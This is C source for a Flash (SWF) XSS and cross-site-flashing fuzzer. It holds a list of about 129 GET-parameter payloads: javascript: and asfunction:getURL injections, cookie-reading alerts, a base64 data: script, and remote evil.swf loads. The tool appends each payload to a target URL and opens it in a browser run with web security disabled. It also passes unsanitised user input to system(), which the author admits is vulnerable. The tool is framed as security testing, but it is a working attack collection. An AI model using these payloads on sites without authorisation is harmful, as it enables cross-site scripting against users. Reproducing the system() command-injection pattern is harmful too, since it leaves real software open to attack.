#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <malloc.h>
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-result"
#pragma GCC diagnostic ignored "-Wformat"
#pragma GCC diagnostic pop


/*********************************************************************************
*    ___    _       ___     ___    _  _      ___   _   _    ____    ____    ___  *
*   | __|  | |     /   \   / __|  | || |    | __| | | | |  |_  /   |_  /   | _ \ * 
*   | _|   | |__   | - |   \__ \  | __ |    | _|  | |_| |   / /     / /    |   / * 
*  _|_|_   |____|  |_|_|   |___/  |_||_|   _|_|_   \___/   /___|   /___|   |_|_\ * 
*_| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|* 
*"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'* 
*                                                                                *
**********************************************************************************
* Version 1.0 - Written by MLT *               Usage:                            *
*                              *                                                 *
* Dependencies: Linux          *          Follow the on-screen instructions      *
*             gnome-www-browser*          Supply SWF as URL only                 *
*               Flare          *          Ensure that you're using a linux       *
*                              *          system with Flare                      *
* I am not responsible for this*          installed.                             *
* tool being used for illegal  *                                                 *
* or malicious purposes        *          I will be writing a Windows port for   *
*                              *          this at some point, but for now this   *
* P.S: I know this is written  *          is designed for linux.                 *
* in a sloppy manner, but it   *                                                 *
* gets the job done regardless *          you'll need to ensure you input the    *
*                              *          correct full path for directory for    *
* complition tested w/ gcc/g++ *          your flare install                     *
* (c11/gnu11 std)              *                                                 *
**********************************************************************************
*     protip: remember to enable flash in firefox (its disabled by default)      *
*     gnome-www-browser will launch your default browser, chrome is best choice  *
*                                                                                *
*     make sure you have your browser already open with a few tabs open before   *
*     running the program, FULL README is located at bottom of the source        *
*********************************************************************************/

void clear()
{
    int x;
    for ( x = 0; x < 10; x++ ) 
    {
        printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"); // too gay for system("cls") or clrscr();
    }
}

int main(void)

{
    DIR *path;
    FILE *fp;
    struct dirent *ptr;
    int primaryInput, helpMenuInput, usageInput, usrInput, fuzzInput, finalInput;
    int j = 0;
    int num = 0;
    char* files[20];  // modify this if necessary
    char in[150], url[150], dir[100], cmd[1000], flare[1000], buff[1000], buffer[1000], line_count[50];
    char the_vectors[129][1000] = {
                                  "'#alert(1337)'",
                                  "'#prompt(1)'",
                                  "'#confirm(1)'",
                                  "'#prompt`1`'",
                                  "'#confirm`1`'",
                                  "'?alert(/XSS/)'",
                                  "'?prompt(/XSS/)'",
                                  "'?confirm(/XSS/)'",
                                  "'?prompt`XSS`'",
                                  "'?confirm`XSS`'",
                                  "'#javascript:confirm(1)'",
                                  "'#javascript:prompt(1)'",
                                  "'#javascript:alert(1337)'",
                                  "'#javascript:confirm(1)//'",
                                  "'#javascript:prompt(1)//'",
                                  "'#javascript:alert(1)//'",
                                  "'#javascript:confirm`xss`'",
                                  "'#javascript:prompt`xss`'",
                                  "'?javascript:alert(1337)'",
                                  "'?javascript:prompt(1)'",
                                  "'?javascript:confirm(1)'",
                                  "'?javascript:prompt`xss`'",
                                  "'?javascript:confirm`xss`'",
                                  "'#getURL(javascript:alert(/XSS/))'",
                                  "'#getURL(javascript:prompt(/XSS/))'",
                                  "'#getURL(javascript:confirm(/XSS/))'",
                                  "'#asfunction:getURL,javascript:alert(1337)//'",
                                  "'#asfunction:getURL,javascript:prompt(0)//'",
                                  "'#asfunction:getURL,javascript:confirm(1337)//'",
                                  "'#asfunction:getURL,javascript:prompt`xss`//'",
                                  "'#asfunction:getURL,javascript:confirm`xss`//'",
                                  "'?asfunction:getURL,javascript:alert(1)//'",
                                  "'?asfunction:getURL,javascript:prompt(1)//'",
                                  "'?asfunction:getURL,javascript:confirm(1)//'",
                                  "'?asfunction:getURL,javascript:prompt`1`//'",
                                  "'?asfunction:getURL,javascript:confirm`1`//'",
                                  "'#getURL,javascript:alert(1)'",
                                  "'#getURL,javascript:prompt(1)'",
                                  "'#getURL,javascript:confirm(1)'",
                                  "'#getURL,javascript:prompt`1`'",
                                  "'#getURL,javascript:confirm`1`'",
                                  "'?getURL(javascript:prompt(/XSS/))'",
                                  "'?getURL(javascript:confirm(/XSS/))'",
                                  "'?getURL,javascript:alert(1)'",
                                  "'?getURL,javascript:prompt(1)'",
                                  "'?getURL,javascript:confirm(1)'",
                                  "'?getURL,javascript:prompt`1`'",
                                  "'?getURL,javascript:confirm`1`'",
                                  "'?goto,javascript:prompt(1)'",
                                  "'?goto,javascript:confirm(1)'",
                                  "'?goto,javascript:prompt`x`'",
                                  "'?goto,javascript:confirm`x`'",
                                  "'?clickTAG=javascript:prompt(/xss/)",
                                  "'?clickTAG=javascript:confirm(/xss/)",
                                  "'?clickTAG=javascript:prompt`xss`",
                                  "'?clickTAG=javascript:confirm`xss`",
                                  "'?url=javascript:prompt(/xss/)'",
                                  "'?url=javascript:confirm(/xss/)'",
                                  "'?url=javascript:prompt`xss`'",
                                  "'?url=javascript:confirm`xss`'",
                                  "'?clickTAG=javascript:prompt(/xss/)&TargetAS='",
                                  "'?clickTAG=javascript:confirm(/xss/)&TargetAS='",
                                  "'?clickTAG=javascript:prompt`xss`&TargetAS='",
                                  "'?clickTAG=javascript:confirm`xss`&TargetAS='",
                                  "'?TargetAS=javascript:prompt(/xss/)'",
                                  "'?TargetAS=javascript:confirm(/xss/)'",
                                  "'?TargetAS=javascript:confirm`x`'",
                                  "'?mode=tags&tagcloud=<tags><a+href=\"javascript:alert(document.cookie)\"+style=\"font-size:+40pt\">Click me</a></tags>'",
                                  "'?mode=tags&tagcloud=<tags><a+href=\"javascript:prompt(document.cookie)\"+style=\"font-size:+40pt\">Click me</a></tags>'",
                                  "'?mode=tags&tagcloud=<tags><a+href=\"javascript:confirm(document.cookie)\"+style=\"font-size:+40pt\">Click me</a></tags>'",
                                  "'?mode=tags&tagcloud=<tags><a+href=\"javascript:alert`1`\"+style=\"font-size:+40pt\">Click me</a></tags>'",
                                  "'?mode=tags&tagcloud=<tags><a+href=\"javascript:prompt`1`\"+style=\"font-size:+40pt\">Click me</a></tags>'",
                                  "'?mode=tags&tagcloud=<tags><a+href=\"javascript:confirm`1`\"+style=\"font-size:+40pt\">Click me</a></tags>'",
                                  "'?mode=tags&tagcloud=<tags><a+href=\"http://google.com\"+style=\"font-size:+40pt\">Click me</a></tags>'",
                                  "'?mode=tags&tagcloud=<tags><a+href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==\"+style=\"font-size:+40pt\">Click me</a></tags>'",
                                  "'?baseurl=asfunction:getURL,javascript:prompt(1)//'",
                                  "'?baseurl=asfunction:getURL,javascript:confirm(1)//'",
                                  "'?baseurl=asfunction:getURL,javascript:confirm`1`//'",
                                  "'?URI=javascript:prompt(/xss/)'",
                                  "'?URI=javascript:confirm(/xss/)'",
                                  "'?getURLValue=javascript:confirm(0)'",
                                  "'?base=javascript:prompt(0)'",
                                  "'?base=javascript:confirm`0`'",
                                  "'?URI=javascript:prompt(/xss/)'",
                                  "'?URI=javascript:confirm`xss`'",
                                  "'?URL=javascript:prompt(/xss/)'",
                                  "'?callback=javascript:prompt(/xss/)'",
                                  "'?callback=javascript:confirm`xss`'",
                                  "'?getURLValue=javascript:prompt(/xss/)'",
                                  "'?getURLValue=javascript:confirm`xss`'",
                                  "'?getURLValue=http://evil.com'",
                                  "'?getURLValue=//www.evil.com'",
                                  "'?getUrlBlankVar=javascript:prompt(0)'",
                                  "'?getUrlBlankVar=javascript:confirm`0`'",
                                  "'?getUrlParentVar=javascript:prompt(0)'",
                                  "'?getUrlParentVar=javascript:confirm(0)'",
                                  "'?getUrlJSParam=\');function eval(a){}prompt(0)//'"
                                  "'?getUrlJSParam=');confirm(0)//'",
                                  "'?goto=javascript:confirm(/xss/)'",
                                  "'?pg=javascript:prompt(/xss/)'",
                                  "'?page=javascript:alert(/xss/)'",
                                  "'?skinName=https://sites.google.com/site/rcannings2/DoKnowEvil'",
                                  "'?skinName=asfunction:getURL,javascript:alert(1)//'",
                                  "'?skinName=asfunction:getURL,javascript:confirm`1`//'",
                                  "'?debugMode=1&dataURL=%%27><img+src%3D\"https://rcannings.googlepages.com/'",
                                  "'?\"><img+src=\"http://rcannings.googlepages.com/DoKnowEvil.swf?.jpg\">'",
                                  "'?onend=javascript:prompt(1)//'",
                                  "'?onend=javascript:confirm(1)//'",
                                  "'?onend=javascript:confirm`1`//'",
                                  "'?\");function%%20someFunction(a){}prompt(1)//'",
                                  "'?\");function%%20someFunction(a){}confirm(1)//'",
                                  "'?a=1:0;prompt(0)//'",
                                  "'?a=1:0;alert(0)//'",
                                  "'?a=1:0;confirm`0`//'",
                                  "'?loadMovieVar=http://test.com/evil.swf'",
                                  "'?loadMovieNumVar=http://test.com/evil.swf'",
                                  "'?loadMovieVar=javascript:prompt(0)'",
                                  "'?loadMovieVar=javascript:cofirm(0)'",
                                  "'?loadMovieVar=javascript:alert`0`'",
                                  "'?xmlLoadVar=asfunction:getURL,javascript:prompt(0)'",
                                  "'?xmlLoadVar=asfunction:getURL,javascript:confirm(0)'",
                                  "'?xmlLoadVar=asfunction:getURL,javascript:alert`0`'",
                                  "'?htmlVar=<a href=\"asfunction:getURL,javascript:prompt(0)\"> Click here</a>'",
                                  "'?htmlVar=<a href=\"asfunction:getURL,javascript:confirm(0)\"> Click here</a>'",
                                  "'?htmlVar=<a href=\"asfunction:getURL,javascript:alert`0`\"> Click here</a>'",
                                  "'?htmlVar=a<img src=\'evil.swf\' />'",
                                  "'?fontVar=\"><img src=\"evil.swf\"><\"'",
                                  "'?externalInterfaceVar=confirm(0)'",
                                  "'?externalInterfaceVar=prompt`0`'",
                                };

                                /**********************************************
                                * will update with moar vectors sometime soon *
                                * if anyone has any contributions then feel   *
                                * free to contact me via email                *
                                **********************************************/ 

MainMenu:    // LOL YEP
          
printf("\n\n                   1011101110+-------------------------------------------------------------------------------------------------+1010010011\n");
printf("                   0000011100|                                 [ FLASHFUZZR ]                                                  |0111110010\n");
printf("                   0001110010|                                                                                                 |1010100111\n");
printf("                   0001111101|                    Automated GET-Based XSS/XSF Fuzzer for SWF's                                 |0110111010\n");
printf("                   0100110000|                      Version 1.0 - Written by MLT (@ret2libc)                                   |1001100001\n");
printf("                   1010011111|                                                                                                 |1010011010\n");
printf("                   0001110110|                           Contact me: 0day@chef.net                                             |0010011111\n");
printf("                   1011001010|                                                                                                 |1001101110\n");
printf("                   0110101110|                                                                                                 |0001101001\n");
printf("                   1011110100|                                                                                                 |0001000100\n");
printf("                   0101010111|                           Type '1' to display instructions                                      |0111010000\n");
printf("                   1100111101|                                                                                                 |1010101101\n");
printf("                   1101111110|                                 .-~*~--,.   .-.                                                 |0011011000\n");
printf("                   1110111010|                         .-~-. ./OOOOOOOOO\\.'OOO`9~~-.                                           |0101101101\n");
printf("                   0110001010|                       .`OOOOOO.OOM.OLSONOOOOO@@OOOOOO\\                                          |0000110111\n");
printf("                   1101100000|                      /OOOO@@@OO@@@OO@@@OOO@@@@@@@@OOOO`.                                        |1001001111\n");
printf("                   0000010010|                      |OO@@@WWWW@@@@OOWWW@WWWW@@@@@@@OOOO).                                      |0000000001\n");
printf("                   1111011101|                    .-'OO@@@@WW@@@W@WWWWWWWWOOWW@@@@@OOOOOO}                                     |1110011110\n");
printf("                   0011101001|                   /OOO@@O@@@@W@@@@@OOWWWWWOOWOO@@@OOO@@@OO|                                     |1101101001\n");
printf("                   1111001000|                  lOOO@@@OO@@@WWWWWWW\\OWWWO\\WWWOOOOOO@@@O.'                                      |1000100000\n");
printf("                   1011000001|                   \\OOO@@@OOO@@@@@@OOW\\     \\WWWW@@@@@@@O'.                                      |0010000000\n");
printf("                   1000100101|                    `,OO@@@OOOOOOOOOOWW\\     \\WWWW@@@@@@OOO)                                     |1111100100\n");
printf("                   1001000000|                     \\,O@@@@@OOOOOOWWWWW\\     \\WW@@@@@OOOO.'                                     |1010111100\n");
printf("                   0110101001|                       `~c~8~@@@@WWW@@W\\       \\WOO|\\UO-~'                                       |1111001010\n");
printf("                   1100111110|                            (OWWWWWW@/\\W\\    ___\\WO)                                             |1001000001\n");
printf("                   1111111000|                              `~-~''     \\   \\WW=*'                                              |0100001001\n");
printf("                   0001110111|                                        __\\   \\                                                  |1010000111\n");
printf("                   1111000011|                                        \\      \\                                                 |0101110101\n");
printf("                   0110000100|                                         \\    __\\                                                |1011010010\n");
printf("                   1111010101|                                          \\  \\                                                   |0011010110\n");
printf("                   0110000010|                                           \\ \\                                                   |1010100110\n");
printf("                   0101110100|                                            \\ \\                                                  |0110110110\n");
printf("                   1100100011|                                             \\ \\                                                 |1100110110\n");
printf("                   0001110011|                                              \\ \\                                                |0110001001\n");
printf("                   0111011100|                                               \\ \\                                               |0100001111\n");
printf("                   0000001011|                                                \\_\\                                              |0011111110\n");
printf("                   1000110000|                                                                                                 |0001101111\n");
printf("                   0110110100+-------------------------------------------------------------------------------------------------+1011010000\n\n\n");

scanf("%d", &primaryInput);

  if (primaryInput == 1)
    {

    HelpMenu:

    clear();

       printf("\n\n                   1011101110+-------------------------------------------------------------------------------------------------+1010010011\n");
       printf("                   0000011100|                                 [ FLASHFUZZR ]                                                  |0111110010\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001111101|                                   Help Menu                                                     |0110111010\n");
       printf("                   1010011111|                                    OPTIONS:                                                     |1010011010\n");
       printf("                   0110101110|                                                                                                 |0001101001\n");
       printf("                   0110101110|                                1 - Usage Guide                                                  |0001101001\n");
       printf("                   0110101110|                                2 - Fuzz for XSS/XSF                                             |0001101001\n");
       printf("                   0110101110|                                3 - Decompile SWF                                                |0001101001\n");
       printf("                   0110101110|                                4 - Return to start page                                         |0001101001\n"); 
       printf("                   0110101110|                                                                                                 |0001101001\n");
       printf("                   0110101110|                             [ Select an option to continue ]                                    |0001101001\n");
       printf("                   0110110100+-------------------------------------------------------------------------------------------------+1011010000\n\n\n");
    } 


  else if (primaryInput != 1)
    { 
    clear();

      fprintf(stderr, "\nRead the instructions next time!\n");
      fprintf(stderr, "\nProgram closing!\n"); 
      exit(0);

      /*************************
      * worst error handling in*
      * existence because i'm  *
      * fkn lazy :)            *
      *************************/
    }
     
     scanf("%d", &helpMenuInput);   

  if (helpMenuInput == 1)  
    {
    clear();

       printf("\n\n                   1011101110+-------------------------------------------------------------------------------------------------+1010010011\n");
       printf("                   0000011100|                                 [ FLASHFUZZR ]                                                  |0111110010\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001111101|                                   Usage Guide                                                   |0110111010\n");                 
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001110010|           To fuzz an SWF for XSS/XSF simply navigate to the help menu then select               |1010100111\n");
       printf("                   0001111101|           the 'fuzz for XSS/XSF' option' and input the remote URL to the SWF file               |0110111010\n");
       printf("                   0001110010|           when instructed - firefox will then begin to open browser windows and                 |1010100111\n");
       printf("                   0001110010|           begin fuzzing for vulns.                                                              |1010100111\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001110010|           To decompile an SWF, navigate to the help menu and select the 'decompile              |1010100111\n");
       printf("                   0001110010|           SWF' option and follow the instructions on screen                                     |1010100111\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001110010|                                   Dependencies:                                                 |1010100111\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001110010|                                  - Mozilla Firefox                                              |1010100111\n");
       printf("                   0001110010|                                  - Linux                                                        |1010100111\n");
       printf("                   0001110010|                                  - Flare                                                        |1010100111\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001110010|                           Type '1' to return to help menu                                       |1010100111\n");
       printf("                   0110110100+-------------------------------------------------------------------------------------------------+1011010000\n\n\n");

       scanf("%d", &usageInput);
 
       if (usageInput == 1)
         {
          clear();
          goto HelpMenu;    // sue me :)
         } 

    }

  else if (helpMenuInput == 2)
    {

      clear();

       printf("\n\n                   1011101110+-------------------------------------------------------------------------------------------------+1010010011\n");
       printf("                   0000011100|                                 [ FLASHFUZZR ]                                                  |0111110010\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001111101|                                   Begin Fuzzing                                                 |0110111010\n");                 
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001110010|           In order to begin fuzzing for vulnerabilities, please enter the direct                |1010100111\n");
       printf("                   0001111101|           link to the remote URL below and hit the 'enter' key to confirm. Ensure               |0110111010\n");
       printf("                   0001110010|           that firefox is installed and that the URL to the SWF you're testing is               |1010100111\n");
       printf("                   0001110010|           correctly typed.                                                                      |1010100111\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001110010|                                 ENTER PATH TO SWF URL:                                          |1010100111\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001110010|                           Type '1' to return to help menu                                       |1010100111\n");
       printf("                   0110110100+-------------------------------------------------------------------------------------------------+1011010000\n\n\n");

      scanf("%d", &usrInput);
 
       if (usrInput == 1)
         {
          clear();
          goto HelpMenu;    // sue me :)
         } 

         scanf("%s", url);
         printf("\n\n\n\n\n                                            [+] Fuzzing initiated on: %s [+]\n\n\n\n\n", url);

         size_t i = 0;

          for (i = 0; i < sizeof(the_vectors) / sizeof(the_vectors[0]); i++)
            {            
           snprintf(buffer, sizeof buffer, "%s%s", url, the_vectors[i]);
           snprintf(cmd, sizeof cmd, "%s%s", "gnome-www-browser --disable-web-security ", buffer); 
           system("sleep .10");
           system(cmd);
           clear();
            }

         printf("\n\n\n\n\n                                            [+] Fuzzing on:  %s complete [+]\n\n\n\n\n", url);
         printf("                                            check each browser tab to see if any vulns are present\n\n\n");
         printf("\n                               Enter '1' to exit the program, or alternatively enter '2' to return to the main menu\n\n\n"); 

         scanf("%d", &fuzzInput);

         if (fuzzInput == 1)
          {
            printf("\nProgram closing!\n\n\n");
            exit(0);
          }  

         if (fuzzInput == 2)
          {
            clear();
            goto MainMenu;    // sue me :)
          }

          else if (fuzzInput != 1 || fuzzInput != 2)
          {
            clear();

            fprintf(stderr, "\nRead the instructions next time!\n");
            fprintf(stderr, "\nProgram closing!\n\n\n");
            exit(0);

            /*************************
            * worst error handling in*
            * existence because i'm  *
            * fkn lazy :)            *
            *************************/
         }

    }

  else if (helpMenuInput == 3)
    {
       clear();
    
       printf("\n\n                   1011101110+-------------------------------------------------------------------------------------------------+1010010011\n");
       printf("                   0000011100|                                 [ FLASHFUZZR ]                                                  |0111110010\n");
       printf("                   0001110010|                                                                                                 |1010100111\n");
       printf("                   0001111101|                                 SWF Decompiler                                                  |0110111010\n");
       printf("                   1010011111|                                                                                                 |1010011010\n");
       printf("                   0110101110|             Remember to modify opendir(); to the path for your 'flare' directory                |0001101001\n");
       printf("                   0110101110|                        Enter any key to begin decompilation                                     |0001101001\n");
       printf("                   0110110100+-------------------------------------------------------------------------------------------------+1011010000\n\n\n");

       /******************************************
       * make sure to follow the installation    *
       * instructions for flare and when running *
       * this program specify the full path to   *
       * the directory where you unpacked the    *
       * tarball for flare.                      *
       *                                         *
       * you should also ensure that you have    *
       * the SWF files that you wish to decompile*
       * stored within this same directory       *
       *                                         *
       * I didn't bother implementing proper err *
       * handling for this, so if you fuck up you*
       * won't be warned. Follow the instructions*
       * and it should work fine :)              *
       ******************************************/

       getchar();
       clear();
       printf("\nEnter the path to the directory of your flare install:\n\n\n");  
       scanf("%s", dir);                                                      
                                                                              
  if ((path = opendir (dir)) != NULL) 
       {

       while ((ptr = readdir (path)) != NULL)
        {
          if (ptr->d_name[0] != '.') 
          {
            printf ("%s\n", ptr->d_name);       
            fp = fopen("listing.txt", "aw+");
            strcpy(in, ptr->d_name);
            strcat(in, "\n");
            fputs(in, fp);
            fclose(fp);
          }
        }
       closedir(path);
        }
  else
   {
      fprintf(stderr, "\nInvalid directory\n");
   }

      fp = fopen("listing.txt", "r");

      while(fgets(line_count, sizeof line_count, fp)!=NULL) 
      {
        files[j]=malloc(sizeof(line_count));
        strcpy(files[j],line_count);
        j++;
        num++;
      }

      for (int x=0 ; x < num+1; x++) 
      {
       if (files[x] != '\0')
        {
          printf("Performing decompilation on: \n%s", files[x]);
          size_t y = 0;

          for (y = 0; y < sizeof(files) / sizeof(files[0]); y++)
            {            
               snprintf(buff, sizeof buff, "%s", files[y]);
               snprintf(flare, sizeof flare, "%s%s", "./flare ", buff); 
               system(flare);
               clear();
           }
        }
     }


      fclose(fp); 
      system("rm listing.txt"); 
      clear();
      printf("\nDecompilation complete!\n\n\n");  
      printf("\nEnter '1' to exit the program, or alternatively enter '2' to return to the main menu\n\n\n"); 
      scanf("%d", &finalInput);

        if (finalInput == 1)
        {
          printf("\nProgram closing!\n\n\n");
          exit(0);
        }  

        if (finalInput == 2)
        {
          clear();
          goto MainMenu;    // sue me :)
        }
   
}

   if (helpMenuInput == 4)
    {
      clear();
      goto MainMenu;    // sue me :)
    }

  else if (helpMenuInput != 1 || helpMenuInput != 2 || helpMenuInput != 3 || helpMenuInput != 4)
    {      
      clear();

      fprintf(stderr, "\nRead the instructions next time!\n");
      fprintf(stderr, "\nProgram closing!\n\n\n");
      exit(0);

      /*************************
      * worst error handling in*
      * existence because i'm  *
      * fkn lazy :)            *
      *************************/
    }

return 0;

}

/*************************************************************************************************
*                README: Full list of dependancies and errors you may encounter                  *
**************************************************************************************************
*                                                                                                *
* The purpose of this program is to allow you to easily perform blackbox + whitebox  testing on  *
* SWF files for vulns such as cross site scripting and cross site flashing.                      *
* In addition to this, I've also added some functionality for decompilation of SWF's.            *
*                                                                                                *
* I noticed flare (probably the most basic command-line flash decompiler) is very limited in     *
* what you can do with it, so I've added a feature here to allow you to specify a directory and  *
* have flare automatically decompile every SWF file within that directory so you can then view   *
* the .flr files and begin to analyze the code for bugs.                                         *
*                                                                                                *
* There are a few dependancies, for now this is working only for linux, you'll need to ensure    *
* that you have gnome-www-browser installed as i'm using this as an alternative to xdg-open due  *
* to extra functionality when launching a URL.                                                   *
*                                                                                                *
* In order to have the SWF decompilation feature working properly, you'll have to ensure you     *
* specify the correct directory where your flare install is located when prompted                *
*                                                                                                *
* you'll also want to modify the size of files[] as appropriate (assuming you're decompiling     *
* more than 20 files at once)                                                                    *
*                                                                                                *
* In order to install flare, download the tarball from here:                                     *
* http://www.nowrap.de/download/flare06linux.tgz                                                 *
*                                                                                                *
* I'm making this launch browser processes rather than opening a socket because this greatly     *
* reduces (100% reduction) false positives and allows you to see the results in real time        *
*                                                                                                *
* I suggest using google chrome for this, firefox will probably be buggy. Before you run this    *
* program, make sure you already have google chrome open with more than one tab opened.          *
*                                                                                                *
* If you experience any issues with chrome not opening each instance in a new tab instantly, then*
* run the following command then try again:                                                      *
*                                                                                                *
* pkill -9 chrome                                                                                *
*                                                                                                *
* if there's still an issue, try running this:                                                   *
*                                                                                                *
* for i in `pgrep chrome` ; do kill $i ;  sleep .10 ; done"                                      *
*                                                                                                *
* I didnt bother implementing proper error handling for the CLI-based menu (as you can prob tell)*
* Just make sure to follow the on-screen instructions and you shouldn't have any problems.       *
*                                                                                                *
* also i'm aware this is probably vulnerable to BoF and is also passing user inputs to system(); *
* but I see no real risk here. If you wanna perform RCE or BoF ON YOUR OWN SYSTEM LOCALLY then   *
* be my guest.                                                                                   *
*                                                                                                *
* ensure that you have write privs for the area you're running this in.                          *
*                                                                                                *
* to compile and execute:                                                                        *
* gcc -o flashfuzz flashfuzz.c -std=gnu11                                                        *
* ./flashfuzz                                                                                    *
*                                                                                                *
*************************************************************************************************/
